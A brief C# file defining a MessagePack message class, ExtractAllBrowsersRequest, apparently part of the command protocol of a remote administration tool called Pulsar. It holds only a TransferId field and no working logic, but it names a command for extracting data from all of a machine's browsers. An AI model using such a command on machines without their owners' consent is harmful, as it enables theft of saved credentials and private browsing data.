using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Browser
{
    [MessagePackObject]
    public class ExtractAllBrowsersRequest : IMessage
    {
        [Key(1)]
        public string TransferId { get; set; }
    }
}
